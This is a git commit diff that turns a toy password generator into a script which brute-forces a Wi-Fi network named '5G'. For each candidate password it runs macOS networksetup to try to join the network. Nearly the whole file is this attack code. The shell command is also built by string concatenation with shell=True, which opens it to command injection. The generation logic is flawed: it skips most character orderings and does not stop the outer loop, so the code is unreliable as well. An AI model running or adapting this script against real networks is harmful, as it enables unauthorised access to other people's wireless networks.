b7cbcbd20ba23d4a34e63066f467e6b00b061062
Emil Aite <aite.emil@gmail.com>
2015-11-04 18:33:13 -0500

    updates to test breaking into wireless network

--- bruteForce.py
+++ bruteForce.py
@@ -1,16 +1,20 @@
-import itertools
+import itertools, subprocess
 
 def check_password(password):
-	if ''.join(password) == "monkey03":
+	#if ''.join(password) == "example01":
+	output = subprocess.check_output("networksetup -setairportnetwork en0 " + wifiName + " " + ''.join(password), shell=True) 
+	print output 
+	if output == "":
 		return True
 	else: return False
 
-password_length = 6
+pwdLength = 6
+wifiName = "5G" 
 characters = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
 for i in range(3,10):
 	gen = itertools.combinations_with_replacement(characters,i) 
 	for password in gen: 
-		print ''.join(password)                                                    
+		print ''.join(password)                                               
 		if check_password(password):
 			break
